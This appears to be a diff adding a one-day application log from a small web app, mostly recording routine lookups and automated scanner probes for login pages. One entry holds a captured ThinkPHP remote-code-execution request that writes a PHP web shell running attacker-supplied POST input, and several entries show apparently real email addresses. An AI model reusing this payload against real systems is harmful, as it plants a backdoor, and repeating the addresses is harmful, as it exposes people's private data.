@@ -1,0 +1,36 @@
+2019-06-24 1:28:10 - INFO --> getUserByCookie: 
+2019-06-24 1:28:10 - INFO --> getZoomById: wp-login.php
+2019-06-24 1:28:13 - INFO --> getUserByCookie: 
+2019-06-24 1:28:13 - INFO --> getZoomById: option=com_user&task=register
+2019-06-24 1:28:18 - INFO --> getUserByCookie: 
+2019-06-24 1:28:18 - INFO --> getZoomById: user/register
+2019-06-24 2:12:22 - INFO --> getUserByCookie: 
+2019-06-24 3:23:43 - INFO --> getUserByCookie: 
+2019-06-24 3:23:43 - INFO --> getZoomById: iSctp
+2019-06-24 3:23:43 - INFO --> incrementZoomById: iSctp
+2019-06-24 3:23:43 - INFO --> increment zoom: iSctp
+2019-06-24 5:03:09 - INFO --> getUserByCookie: 
+2019-06-24 5:03:09 - INFO --> getZoomById: email=talmilburn%40gmail.com&reportType=&description=&
+2019-06-24 8:06:06 - INFO --> getUserByCookie: 
+2019-06-24 8:06:06 - INFO --> getZoomById: email=hazyczengeni%40gmail.com&reportType=&description=&
+2019-06-24 8:50:10 - INFO --> getUserByCookie: 
+2019-06-24 8:50:10 - INFO --> getZoomById: wp-login.php
+2019-06-24 9:28:50 - INFO --> getUserByCookie: 
+2019-06-24 9:28:50 - INFO --> getZoomById: email=gnrltsao%40gmail.com&reportType=&description=&
+2019-06-24 11:21:13 - INFO --> getUserByCookie: 
+2019-06-24 11:21:13 - INFO --> getZoomById: email=zoompatriot%40gmail.com&reportType=&description=&
+2019-06-24 14:11:37 - INFO --> getUserByCookie: 
+2019-06-24 14:11:37 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=qxqor.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bqazw%5D);?%3E
+2019-06-24 15:29:51 - INFO --> getUserByCookie: 
+2019-06-24 15:29:51 - INFO --> getZoomById: iSctp
+2019-06-24 15:29:51 - INFO --> incrementZoomById: iSctp
+2019-06-24 15:29:51 - INFO --> increment zoom: iSctp
+2019-06-24 16:53:23 - INFO --> getUserByCookie: 
+2019-06-24 16:53:23 - INFO --> getZoomById: iSctp
+2019-06-24 16:53:23 - INFO --> incrementZoomById: iSctp
+2019-06-24 16:53:23 - INFO --> increment zoom: iSctp
+2019-06-24 17:40:01 - INFO --> getUserByCookie: 
+2019-06-24 17:50:34 - INFO --> getUserByCookie: 
+2019-06-24 17:50:34 - INFO --> getZoomById: wp-login.php
+2019-06-24 19:48:21 - INFO --> getUserByCookie: 
+2019-06-24 19:48:21 - INFO --> getZoomById: wp-login.php
